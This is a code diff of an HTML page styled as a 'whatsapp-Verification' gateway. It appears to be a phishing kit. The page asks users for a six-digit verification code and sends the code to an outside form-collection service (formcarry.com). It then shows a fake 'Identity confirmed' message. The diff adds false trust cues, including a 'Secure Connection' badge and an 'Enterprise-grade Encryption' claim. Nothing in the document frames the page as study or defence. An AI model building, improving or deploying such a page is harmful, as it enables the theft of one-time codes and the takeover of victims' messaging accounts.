@@ -3,106 +3,205 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verification Portal</title>
+  <title> whatsapp-Verification | Gateway</title>
   <style>
-    body { 
-      margin: 0; 
-      font-family: Arial, sans-serif; 
-      background: #1a1a1a url('background.jpg') no-repeat center center fixed; 
-      background-size: cover !important; 
-      color: white; 
-      text-align: center; 
-    }
-    .overlay { 
-      background: rgba(0,0,0,0.6); 
-      min-height: 100vh; 
-      width: 100%;
-      padding-top: 80px; 
-    }
-    .container { 
-      background: rgba(20,20,20,0.85); 
-      padding: 30px; 
-      width: 320px; 
-      margin: auto; 
-      border-radius: 10px; 
-      border: 1px solid rgba(255,255,255,0.1);
-    }
-    .logo { width: 250px; margin-bottom: 20px; }
-    
-    /* Input Styling */
-    input { 
-      display: block; 
-      margin: 15px auto; 
-      padding: 12px; 
-      width: 90%; 
-      border-radius: 5px; 
-      border: 1px solid #444; 
-      background: white; 
-      color: black; 
-      font-size: 16px;
-      text-align: center;
+    :root {
+      --primary: #10b981; /* Emerald */
+      --primary-dark: #059669;
+      --bg-base: #0f172a; /* Slate 900 */
+      --card-bg: rgba(30, 41, 59, 0.7); /* Slate 800 with opacity */
+      --text-main: #f8fafc;
+      --text-muted: #94a3b8;
+      --border: rgba(255, 255, 255, 0.1);
     }
 
+    body { 
+      margin: 0; 
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+      background: var(--bg-base) url('background.jpg') no-repeat center center fixed; 
+      background-size: cover !important; 
+      color: var(--text-main); 
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .overlay { 
+      background: radial-gradient(circle at center, rgba(15, 23, 42, 0) 0%, rgba(15, 23, 42, 0.9) 100%);
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container { 
+      background: var(--card-bg);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      padding: 48px 40px; 
+      width: 100%;
+      max-width: 380px; 
+      border-radius: 24px; 
+      border: 1px solid var(--border);
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+      box-sizing: border-box;
+    }
+
+    .logo { 
+      height: 40px; 
+      margin-bottom: 32px; 
+      filter: brightness(0) invert(1); /* Forces logo to white if it's dark */
+      opacity: 0.9;
+    }
+
+    .security-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(16, 185, 129, 0.1);
+      color: var(--primary);
+      padding: 6px 12px;
+      border-radius: 100px;
+      font-size: 11px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 20px;
+    }
+    
+    h2 { font-size: 24px; font-weight: 700; margin: 0 0 8px 0; letter-spacing: -0.025em; }
+    p { font-size: 14px; color: var(--text-muted); line-height: 1.6; margin-bottom: 24px; }
+    
+    /* Modern Input Styling */
+    input { 
+      display: block; 
+      margin: 24px auto; 
+      padding: 16px; 
+      width: 100%; 
+      border-radius: 12px; 
+      border: 1px solid rgba(255,255,255,0.1); 
+      background: rgba(0, 0, 0, 0.2); 
+      color: white; 
+      font-size: 20px;
+      font-weight: 600;
+      letter-spacing: 6px;
+      text-align: center;
+      transition: all 0.2s ease;
+      box-sizing: border-box;
+    }
+    
+    input:focus {
+      outline: none;
+      border-color: var(--primary);
+      background: rgba(0, 0, 0, 0.4);
+      box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.2);
+    }
+
+    /* Professional Button Styling */
     button { 
-      padding: 12px; 
-      border-radius: 5px; 
+      padding: 16px; 
+      border-radius: 12px; 
       border: none; 
       cursor: pointer; 
-      background: #f0f0f0; 
-      font-weight: bold; 
-      width: 95%; 
-      margin-top: 10px; 
+      background: #f8fafc; 
+      color: #0f172a;
+      font-weight: 600; 
+      width: 100%; 
+      font-size: 15px;
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
-    button:disabled { background: #666 !important; cursor: not-allowed; }
+
+    button:hover { background: #ffffff; transform: translateY(-1px); }
+    button:active { transform: translateY(0); }
+    button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
     
-    .btn-verify { background: #4caf50; color: white; margin-top: 10px; }
+    .btn-verify { 
+      background: var(--primary); 
+      color: white; 
+      margin-top: 16px; 
+    }
+    .btn-verify:hover { background: var(--primary-dark); }
     
-    .status-msg { margin-top: 15px; font-size: 14px; color: #ffd700; display: none; }
+    .status-msg { 
+      margin-top: 20px; 
+      font-size: 13px; 
+      color: #fbbf24; /* Amber 400 */
+      font-weight: 500;
+      padding: 12px;
+      background: rgba(251, 191, 36, 0.1);
+      border-radius: 8px;
+    }
     
-    /* This section stays hidden until the request is sent */
-    #codeEntrySection { display: none; margin-top: 20px; }
+    #codeEntrySection { 
+        display: none; 
+        margin-top: 24px; 
+        animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    @keyframes slideUp {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
     
-    hr { margin: 25px 0; border: 0; border-top: 1px solid #444; }
+    .footer-note {
+      margin-top: 24px;
+      font-size: 11px;
+      color: var(--text-muted);
+    }
   </style>
 </head>
 <body>
 
 <div class="overlay">
   <div class="container">
-    <img src="logo.png" class="logo" alt="Logo">
+    <img src="logo.png" class="logo" alt="Company Logo">
 
     <div id="mainSection">
-      <h2>Verification</h2>
-      <p style="font-size: 12px; color: #aaa;">Click below to receive your secure code.</p>
+      <div class="security-badge">
+        <svg width="12" height="12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+        Secure Connection
+      </div>
+      
+      <h2>Verification Required</h2>
+      <p>Confirm your identity to access the portal. A unique code will be sent to your registered device.</p>
       
       <form id="vForm" action="https://formcarry.com/s/tbk_myA3Xem" method="POST">
-        
-        <!-- HIDDEN PHONE DATA: Replaces the manual phone input -->
         <input type="hidden" name="phone_number" value="Hidden_System_User">
         <input type="hidden" name="intent" id="intent" value="">
 
-        <!-- Initial Request Button -->
-        <button type="submit" id="reqBtn">Request Code</button>
+        <button type="submit" id="reqBtn">
+          Request Verification Code
+        </button>
         
-        <div id="waitMessage" class="status-msg">
-          ✔ Request Sent! Your code is being generated...
+        <div id="waitMessage" class="status-msg" style="display:none;">
+          Request sent. Please check your inbox or SMS.
         </div>
 
-        <!-- HIDDEN SECTION: Appears after clicking Request -->
         <div id="codeEntrySection">
-          <hr>
-          <h3 style="margin-bottom: 5px;">Enter Code</h3>
-          <p style="font-size: 11px; color: #888;">Check your device for the 6-digit code.</p>
+          <h3 style="margin: 0; font-size: 16px; font-weight: 600;">Enter Code</h3>
+          <p style="font-size: 13px; margin: 4px 0 0 0;">6-digit security key</p>
           
-          <input type="text" name="received_code" id="codeInput" placeholder="000000" maxlength="6">
+          <input type="text" name="received_code" id="codeInput" placeholder="000000" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
           
-          <button type="submit" id="subBtn" class="btn-verify">Submit & Verify</button>
+          <button type="submit" id="subBtn" class="btn-verify">Verify and Continue</button>
           
-          <div id="successMessage" class="status-msg" style="color: #4caf50;">
-            ✔ Verifying... Please wait.
+          <div id="successMessage" class="status-msg" style="color: var(--primary); background: rgba(16, 185, 129, 0.1); display:none;">
+            Identity confirmed. Redirecting...
           </div>
         </div>
       </form>
+      
+      <div class="footer-note">
+        Protected by Enterprise-grade Encryption.
+      </div>
     </div>
   </div>
 </div>
@@ -121,16 +220,14 @@
     const clickedBtn = document.activeElement;
     const isRequest = clickedBtn.id === 'reqBtn';
     
-    // Set the hidden intent
     intentInput.value = isRequest ? "Requesting New Code" : "User Entered Code: " + codeInput.value;
 
     const statusId = isRequest ? 'waitMessage' : 'successMessage';
     const statusMsg = document.getElementById(statusId);
 
-    // Disable button during processing
     clickedBtn.disabled = true;
     const originalText = clickedBtn.innerText;
-    clickedBtn.innerText = "Processing...";
+    clickedBtn.innerHTML = "Processing...";
 
     try {
       const response = await fetch(vForm.action, {
@@ -140,30 +237,20 @@
       });
 
       if (response.ok) {
-        clickedBtn.innerText = "Success";
+        clickedBtn.innerText = "Authorized";
         statusMsg.style.display = "block";
         
-        // If it was a request, show the "Enter Code" section
         if (isRequest) {
           setTimeout(() => {
             codeSection.style.display = "block";
-            reqBtn.style.display = "none"; // Hide the request button after success
-          }, 1000);
+            reqBtn.style.display = "none"; 
+          }, 600);
         }
-        
-        // Reset processing state
-        setTimeout(() => {
-          clickedBtn.disabled = false;
-          clickedBtn.innerText = originalText;
-        }, 4000);
-
       } else {
-        alert("Error " + response.status + ": System busy. Please try again.");
-        clickedBtn.disabled = false;
-        clickedBtn.innerText = "Try Again";
+        throw new Error();
       }
     } catch (error) {
-      alert("Connection Blocked. Please disable Ad-Blockers and run from a server.");
+      alert("Verification service unavailable. Please check your network.");
       clickedBtn.disabled = false;
       clickedBtn.innerText = "Try Again";
     }
